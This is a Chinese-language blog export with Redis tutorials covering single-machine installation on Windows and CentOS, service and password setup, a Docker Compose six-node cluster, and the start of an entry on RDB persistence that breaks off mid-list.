<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli.exe <span class="token parameter variable">-h</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token parameter variable">-a</span> requirepass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-h</td>
<td>服务器地址</td>
</tr>
<tr>
<td>-p</td>
<td>指定端口号</td>
</tr>
<tr>
<td>-a</td>
<td>连接数据库的密码[可以在redis.windows.conf中配置]，默认无密码</td>
</tr>
</tbody>
</table>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image012.png" alt="05c2f1e1f504cb3480c6a96e746c0554.png"><br>
安装测试成功。</p>
<h1>单机安装：Centos</h1>
<h2 id="准备">准备</h2>
<ol>
<li>下载redis安装包</li>
</ol>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://download.redis.io/releases/redis-4.0.6.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image013.png" alt="4500b2d7d6f71a55db9aef7a8050394e.png"></p>
<ol start="2">
<li>解压压缩包</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> zxvf redis-4.0.6.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image014.png" alt="632ce9c44a953178bb01cedd24d4d8ab.png"></p>
<ol start="3">
<li>yum安装gcc依赖</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token parameter variable">-y</span> <span class="token function">install</span> gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="安装-2">安装</h2>
<ol>
<li>跳转到redis解压目录下</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/software/redis-4.0.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="2">
<li>编译安装</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image015.png" alt="9760df7be3b6d1534296047905b13e61.png"></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">将/usr/software/redis-4.0.6/src目录下的文件加到/usr/local/bin目录

<span class="token builtin class-name">cd</span> src <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image016.png" alt="4aaeefe75f7c20cb5039b355f7062e7f.png"></p>
<h2 id="启动redis的三种方式">启动redis的三种方式</h2>
<h3 id="直接启动">直接启动</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">先切换到redis src目录下

<span class="token builtin class-name">cd</span> /usr/software/redis-4.0.6/src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>直接启动redis</p>
 <pre class="line-numbers language-none"><code class="language-none">./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image017.png" alt="277d11179a4ec94b22e978a0f10f1a36.png"><br>
如上图：redis启动成功，但是这种启动方式需要一直打开窗口，不能进行其他操作，不太方便。<br>
按 ctrl + c可以关闭窗口。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image018.png" alt="19606b9997c671ce2722f2315ddff2dd.png"></p>
<h3 id="以后台进程方式启动redis">以后台进程方式启动redis</h3>
<ol>
<li>
<p>修改redis.conf文件</p>
<pre class="line-numbers language-none"><code class="language-none">cd /usr/software/redis-4.0.6
vi redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>将 <code>daemonize no</code> 修改 <code>daemonize yes</code></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image019.png" alt="4690346a97fc0b147c66c8220cfb6e70.png"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image020.png" alt="e5b2377dbc25cbf8dbd5a97341b744db.png"></p>
</li>
<li>
<p>指定redis.conf文件启动</p>
<pre class="line-numbers language-none"><code class="language-none">cd /usr/software/redis-4.0.6/src
./redis-server /usr/software/redis-4.0.6/redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>关闭redis进程</p>
<pre class="line-numbers language-none"><code class="language-none">ps -aux | grep redis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image021.png" alt="4b9b6364ca42da21b0e27f1e1dc90824.png"></p>
<pre class="line-numbers language-none"><code class="language-none">kill -9 11753<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h3 id="设置redis为系统服务">设置redis为系统服务</h3>
<ol>
<li>
<p>在/etc目录下新建redis目录</p>
<pre class="line-numbers language-none"><code class="language-none">cd /etc
mkdir redis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>将 <code>/usr/software/redis-4.0.6/redis.conf </code>文件复制一份到/etc/redis目录下，并命名为6379.conf</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/software/redis-4.0.6/redis.conf /etc/redis/6379.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>将redis的启动脚本复制一份放到/etc/init.d目录下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/software/redis-4.0.6/utils/redis_init_script /etc/init.d/redisd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>设置redis开机自启动</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/init.d
<span class="token function">chkconfig</span> redisd on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>出现问题1：</p>
<pre class="line-numbers language-none"><code class="language-none">service redisd does not support chkconfig　<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看结果是redisd不支持chkconfig<br>
解决方法：<code>vi /etc/init.d/redisd</code>，加入如下两行注释，保存退出</p>
 <pre class="line-numbers language-none"><code class="language-none"># chkconfig: 2345 90 10
# summary: Redis is a persistent key-value database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image022.png" alt="ea9dc06f591188ad0d2c8ff4c0e8c4be.png"></p>
<p>注释的意思是：redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image023.png" alt="48608ef900b2bd7ed0f5a08598d11463.png"></p>
<p>再次执行开机自启命令，成功</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chkconfig</span> redisd on<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>现在可以直接以服务的形式启动和关闭redis了</p>
<p>再次启动：</p>
 <pre class="line-numbers language-none"><code class="language-none">service redisd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>出现问题2：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image024.png" alt="95d24c1fc0745a3f0e55b6140ee87462.png"></p>
<p>删除：<code>redis_6379.pid</code>后，再次执行：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image025.png" alt="b401291681b760b35c2643e97dbddb25.png"></p>
</li>
<li>
<p>关闭</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> redisd stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h3 id="配置密码登录">配置密码登录</h3>
<ol>
<li>
<p>修改配置文件，使用密码登录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /usr/software/redis-4.0.6/redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image026.png" alt="89a9f187a67da6a0bdc92f8f05ff54b1.png"></p>
<p>此时，访问redis客户端查询</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image027.png" alt="7742f0112fb76da057cc87316510da4d.png"></p>
<p>使用密码后，停止服务会报错：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> redisd stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image028.png" alt="9d88c06e13e7f4116629ae69fdaecd03.png"></p>
</li>
<li>
<p>修改启动配置文件</p>
<pre class="line-numbers language-none"><code class="language-none">vi /etc/init.d/redisd


将其中的
CLIEXEC -p REDISPORT shutdown
改为
CLIEXEC -a "3448395502" -p REDISPORT shutdown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="防火墙开放端口6179">防火墙开放端口6179</h2>
<ol>
<li>
<p>开启6179</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/sbin/iptables <span class="token parameter variable">-I</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">6179</span> <span class="token parameter variable">-j</span> ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>保存</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/rc.d/init.d/iptables save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>centos 7下执行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> iptables save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">参考：
https://blog.csdn.net/zc474235918/article/details/50974483
https://www.cnblogs.com/aqicheng/p/11512153.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1>Docker安装Redis集群</h1>
<blockquote>
<p>集群至少6个节点</p>
<ol>
<li>集群至少3个主节点</li>
<li>每个主节点至少一个从节点（若一个主节点设置2个从节点，则需要9个节点）</li>
</ol>
</blockquote>
<h2 id="1-环境准备">1. 环境准备</h2>
<blockquote>
<p>redis.conf模板文件redis-cluster.tmpl</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none"># redis端口
port ${NODE_PORT}
requirepass custom_password
masterauth custom_password

# 开启集群
cluster-enabled yes
appendonly yes
cluster-node-timeout 5000
#protected-mode no

loglevel notice
logfile /redis/log/redis.log
dir /redis/data

# 集群节点配置
cluster-announce-ip 172.16.163.128
cluster-announce-port ${NODE_PORT}
cluster-announce-bus-port 1${NODE_PORT}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>批量生成节点文件的批处理程序：<a href="http://redis-cluster-config-before.sh">redis-cluster-config-before.sh</a></p>
</blockquote>
<p><code> chmod u+x redis-cluster-config-before.sh</code> 修改可执行权限</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash  </span>
<span class="token comment"># 节点数据</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">port</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">6381</span> <span class="token number">6386</span><span class="token variable">)</span></span>
<span class="token keyword">do</span> 
 <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /opt/docker/redis-cluster-7.0.0/<span class="token variable">${port}</span>
 <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /opt/docker/redis-cluster-7.0.0/<span class="token variable">${port}</span>/data<span class="token punctuation">;</span> 
 <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /opt/docker/redis-cluster-7.0.0/<span class="token variable">${port}</span>/log<span class="token punctuation">;</span> 
 <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /opt/docker/redis-cluster-7.0.0/<span class="token variable">${port}</span>/conf<span class="token punctuation">;</span> 
 <span class="token function">chmod</span> <span class="token number">777</span> /opt/docker/redis-cluster-7.0.0/<span class="token variable">${port}</span>/conf
 <span class="token function">chmod</span> <span class="token number">777</span> /opt/docker/redis-cluster-7.0.0/<span class="token variable">${port}</span>/log
 <span class="token function">chmod</span> <span class="token number">777</span> /opt/docker/redis-cluster-7.0.0/<span class="token variable">${port}</span>/data
<span class="token comment">#  export NODE_PORT=${port}</span>
<span class="token comment">#  export NODE_INDEX=`expr ${port} - 6379` </span>
<span class="token comment">#  export NODE_IP=172.19.0.${NODE_INDEX}</span>
<span class="token comment">#  echo ${NODE_IP} ${NODE_PORT}</span>
 <span class="token assign-left variable">NODE_PORT</span><span class="token operator">=</span><span class="token variable">${port}</span> envsubst <span class="token operator">&lt;</span> /opt/docker/redis-cluster-7.0.0/redis-cluster.tmpl <span class="token operator">&gt;</span> /opt/docker/redis-cluster-7.0.0/<span class="token variable">${port}</span>/conf/redis.conf<span class="token punctuation">;</span>
<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-创建容器">2. 创建容器</h2>
<blockquote>
<p>docker-compose.yml 文件</p>
</blockquote>
<p><code>docker-compose up -d</code></p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3.7'</span>
<span class="token key atrule">services</span><span class="token punctuation">:</span>
  <span class="token key atrule">redis_6381</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'redis:7.0.0'</span>
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> redis_6381
    <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">command</span><span class="token punctuation">:</span>
      redis<span class="token punctuation">-</span>server /usr/local/etc/redis/redis.conf
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./6381/conf/redis.conf<span class="token punctuation">:</span>/usr/local/etc/redis/redis.conf
      <span class="token punctuation">-</span> ./6381/data<span class="token punctuation">:</span>/redis/data
      <span class="token punctuation">-</span> ./6381/log<span class="token punctuation">:</span>/redis/log
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">"6381:6381"</span>
      <span class="token punctuation">-</span> <span class="token string">"16381:16381"</span>
  
  <span class="token key atrule">redis_6382</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'redis:7.0.0'</span>
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> redis_6382
    <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">command</span><span class="token punctuation">:</span>
      redis<span class="token punctuation">-</span>server /usr/local/etc/redis/redis.conf
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./6382/conf/redis.conf<span class="token punctuation">:</span>/usr/local/etc/redis/redis.conf
      <span class="token punctuation">-</span> ./6382/data<span class="token punctuation">:</span>/redis/data
      <span class="token punctuation">-</span> ./6382/log<span class="token punctuation">:</span>/redis/log
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">"6382:6382"</span>
      <span class="token punctuation">-</span> <span class="token string">"16382:16382"</span>


  <span class="token key atrule">redis_6383</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'redis:7.0.0'</span>
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> redis_6383
    <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">command</span><span class="token punctuation">:</span>
      redis<span class="token punctuation">-</span>server /usr/local/etc/redis/redis.conf
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./6383/conf/redis.conf<span class="token punctuation">:</span>/usr/local/etc/redis/redis.conf
      <span class="token punctuation">-</span> ./6383/data<span class="token punctuation">:</span>/redis/data
      <span class="token punctuation">-</span> ./6383/log<span class="token punctuation">:</span>/redis/log
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">"6383:6383"</span>
      <span class="token punctuation">-</span> <span class="token string">"16383:16383"</span>

  <span class="token key atrule">redis_6384</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'redis:7.0.0'</span>
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> redis_6384
    <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">command</span><span class="token punctuation">:</span>
      redis<span class="token punctuation">-</span>server /usr/local/etc/redis/redis.conf
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./6384/conf/redis.conf<span class="token punctuation">:</span>/usr/local/etc/redis/redis.conf
      <span class="token punctuation">-</span> ./6384/data<span class="token punctuation">:</span>/redis/data
      <span class="token punctuation">-</span> ./6384/log<span class="token punctuation">:</span>/redis/log
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">"6384:6384"</span>
      <span class="token punctuation">-</span> <span class="token string">"16384:16384"</span>

  <span class="token key atrule">redis_6385</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'redis:7.0.0'</span>
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> redis_6385
    <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">command</span><span class="token punctuation">:</span>
      redis<span class="token punctuation">-</span>server /usr/local/etc/redis/redis.conf
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./6385/conf/redis.conf<span class="token punctuation">:</span>/usr/local/etc/redis/redis.conf
      <span class="token punctuation">-</span> ./6385/data<span class="token punctuation">:</span>/redis/data
      <span class="token punctuation">-</span> ./6385/log<span class="token punctuation">:</span>/redis/log
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">"6385:6385"</span>
      <span class="token punctuation">-</span> <span class="token string">"16385:16385"</span>

  <span class="token key atrule">redis_6386</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> <span class="token string">'redis:7.0.0'</span>
    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> redis_6386
    <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always
    <span class="token key atrule">command</span><span class="token punctuation">:</span>
      redis<span class="token punctuation">-</span>server /usr/local/etc/redis/redis.conf
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./6386/conf/redis.conf<span class="token punctuation">:</span>/usr/local/etc/redis/redis.conf
      <span class="token punctuation">-</span> ./6386/data<span class="token punctuation">:</span>/redis/data
      <span class="token punctuation">-</span> ./6386/log<span class="token punctuation">:</span>/redis/log
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token string">"6386:6386"</span>
      <span class="token punctuation">-</span> <span class="token string">"16386:16386"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="3-防火墙">3. 防火墙</h2>
<p>开放<code>6381-6386 16381-16386</code>端口</p>
<ul>
<li>Urban <code>ufw allow 6381</code> 然后查看 <code>ufw status</code></li>
<li>Linux   <code>firewall-cmd --zone=public --add-port=6381/tcp --permanent</code> 然后查看 <code>firewall-cmd --zone= public --query-port=6381/tcp</code></li>
</ul>
<h2 id="4-集群配置">4.  集群配置</h2>
<ul>
<li>进入其中一个节点的容器命令行：<code>docker exec -it redis_6382 bash</code></li>
<li>集群各个节点自动分配：<code>redis-cli -a custom_password --cluster create 172.16.163.128:6381 172.16.163.128:6382 172.16.163.128:6383 172.16.163.128:6384 172.16.163.128:6385 172.16.163.128:6386 --cluster-replicas 1</code></li>
<li>集群测试：<code>redis-cli -a custom_password --cluster check 172.16.163.128:6381</code></li>
<li>集群健康：<code>redis-cli -c -h 172.16.163.128 -p 6381 -a custom_password</code>进入容器，查看<code>cluster info</code></li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-持久化</title>
    <url>/20221102/574fe2f4.html</url>
    <content><![CDATA[<ul>
<li>
<p><strong>为什么需要持久化</strong>？</p>
<p>Redis是个基于内存的数据库。那服务一旦宕机，内存中的数据将全部丢失。通常的解决方案是从后端数据库恢复这些数据，但后端数据库有性能瓶颈，如果是大数据量的恢复  1、会对数据库带来巨大的压力，2、数据库的性能不如Redis。导致程序响应慢。所以对Redis来说，实现数据的持久化，避免从后端数据库中恢复数据，是至关重要的。</p>
</li>
<li>
<p><strong>Redis持久化有哪些方式呢</strong>？</p>
<p>从严格意义上说，Redis服务提供四种持久化存储方案：<code>RDB</code>、<code>AOF</code>、<code>虚拟内存（VM）</code>和　<code>DISKSTORE</code>。</p>
<p><strong>虚拟内存（VM）方式</strong>，从Redis Version 2.4开始就被官方明确表示不再建议使用，Version 3.2版本中更找不到关于虚拟内存（VM）的任何配置范例.Redis的主要作者Salvatore Sanfilippo还专门写了一篇论文，来反思Redis对虚拟内存（VM）存储技术的支持问题。</p>
<p><strong>DISKSTORE方式</strong>，是从Redis Version 2.8版本开始提出的一个存储设想，到目前为止Redis官方也没有在任何stable版本中明确建议使用这用方式。在Version 3.2版本中同样找不到对于这种存储方式的明确支持</p>
</li>
<li>
<p><strong>为什么我们需要重点学RDB和AOF</strong>？</p>
<p>目前官方文档上能够看到的Redis对持久化存储的支持明确的就只有两种方案（<a href="https://redis.io/topics/persistence%EF%BC%89%EF%BC%9ARDB%E5%92%8CAOF">https://redis.io/topics/persistence）：RDB和AOF</a></p>
</li>
</ul>
<h1>RDB</h1>
<blockquote>
<p>RDB 就是 Redis DataBase 的缩写，中文名为快照/内存快照，RDB持久化是把当前进程数据生成快照保存到磁盘上的过程，由于是某一时刻的快照，那么快照中的值要早于或者等于内存中的值</p>
</blockquote>
<h2 id="触发方式">触发方式</h2>
<blockquote>
<p>触发rdb持久化的方式有2种，分别是<strong>手动触发</strong>和<strong>自动触发</strong>。</p>
</blockquote>
<h3 id="手动触发">手动触发</h3>
<blockquote>
<p>手动触发分别对应<code>save</code>和<code>bgsave</code>命令，会在<code>data</code>文件夹下生成<code>dump.rdb</code>文件</p>
</blockquote>
<ul>
<li>
<p><strong>save命令</strong>：阻塞当前Redis服务器，直到RDB过程完成为止，对于内存 比较大的实例会造成长时间<strong>阻塞</strong>，线上环境不建议使用</p>
</li>
<li>
<p><strong>bgsave命令</strong>：Redis进程执行<code>fork</code>操作，创建子进程，RDB持久化过程由子进程负责，完成后自动结束。阻塞只发生在fork阶段，一般时间很短。具体流程如下：</p>
</li>
</ul>
<ol>
<li>
<p>redis客户端执行<code>bgsave</code>命令或者自动触发<code>bgsave</code>命令；</p>
</li>
<li>
<p>主进程判断当前是否已经存在正在执行的子进程，如果存在，那么主进程直接返回；</p>
</li>
<li>
<p>如果不存在正在执行的子进程，那么就<code>fork</code>一个新的子进程进行持久化数据，<strong><code>fork</code>过程是阻塞的</strong>，fork操作完成后主进程即可执行其他操作；</p>
</li>
<li>
<p>子进程先将数据写入到临时的<code>rdb</code>文件中，待快照数据写入完成后再原子替换旧的<code>rdb</code>文件；</p>
</li>
<li>
<p>同时发送信号给主进程，通知主进程<code>rdb</code>持久化完成，主进程更新相关的统计信息（info persitence下的rdb_*相关选项）。</p>
</li>
</ol>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/redis-x-rdb-1-1676430207109-3.png" alt="img"></p>
<h3 id="自动触发">自动触发</h3>
<p>在以下4种情况时会自动触发</p>
<ul>
<li>
<p>redis.conf中配置<code>save m n</code>，即在m秒内有n次修改时，自动触发bgsave生成rdb文件；</p>
</li>
<li>
<p>主从复制时，从节点要从主节点进行全量复制时也会触发bgsave操作，生成当时的快照发送到从节点；</p>
</li>
<li>
<p>执行<code>debug reload</code>命令重新加载redis时也会触发bgsave操作；</p>
</li>
<li>
<p>默认情况下执行<code>shutdown</code>命令时，如果没有开启<code>aof</code>持久化，那么也会触发bgsave操作</p>
</li>
</ul>
<h2 id="redis-conf配置RDB">redis.conf配置RDB</h2>
<p><strong>快照周期</strong>：内存快照虽然可以通过技术人员手动执行SAVE或BGSAVE命令来进行，但生产环境下多数情况都会设置其周期性执行条件。</p>
<ul>
<li>
<p><strong>Redis中默认的周期新设置</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 周期性执行条件的设置格式为</span>
save <span class="token operator">&lt;</span>seconds<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>changes<span class="token operator">&gt;</span>

<span class="token comment"># 默认的设置为：</span>
save <span class="token number">900</span> <span class="token number">1</span>  <span class="token comment"># 如果900秒内有1条Key信息发生变化，则进行快照</span>
save <span class="token number">300</span> <span class="token number">10</span> <span class="token comment"># 如果300秒内有10条Key信息发生变化，则进行快照；</span>
save <span class="token number">60</span> <span class="token number">10000</span> <span class="token comment"># 如果60秒内有10000条Key信息发生变化，则进行快照；</span>

<span class="token comment"># 以下设置方式为关闭RDB快照功能</span>
save <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>其它相关配置</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 文件名称</span>
dbfilename dump.rdb
<span class="token comment"># 文件保存路径</span>
<span class="token function">dir</span> /home/work/app/redis/data/
<span class="token comment"># 如果持久化出错，主进程是否停止写入</span>
stop-writes-on-bgsave-error <span class="token function">yes</span>
<span class="token comment"># 是否压缩</span>
rdbcompression <span class="token function">yes</span>
<span class="token comment"># 导入时是否检查</span>
rdbchecksum <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p><code>dbfilename</code>：RDB文件在磁盘上的名称。</p>
</li>
<li>
<p><code>dir</code>：RDB文件的存储路径。默认设置为“./”，也就是Redis服务的主目录。</p>
</li>
<li>
<p><code>stop-writes-on-bgsave-error</code>：上文提到的在快照进行过程中，主进程照样可以接受客户端的任何写操作的特性，是指在快照操作正常的情况下。如果快照操作出现异常（例如操作系统用户权限不够、磁盘空间写满等等）时，Redis就会禁止写操作。这个特性的主要目的是使运维人员在第一时间就发现Redis的运行错误，并进行解决。一些特定的场景下，您可能需要对这个特性进行配置，这时就可以调整这个参数项。该参数项默认情况下值为yes，如果要关闭这个特性，指定即使出现快照错误Redis一样允许写操作，则可以将该值更改为no。</p>
</li>
<li>
<p><code>rdbcompression</code>：该属性将在字符串类型的数据被快照到磁盘文件时，启用LZF压缩算法。Redis官方的建议是请保持该选项设置为yes，因为“it’s almost always a win”。</p>
</li>
<li>
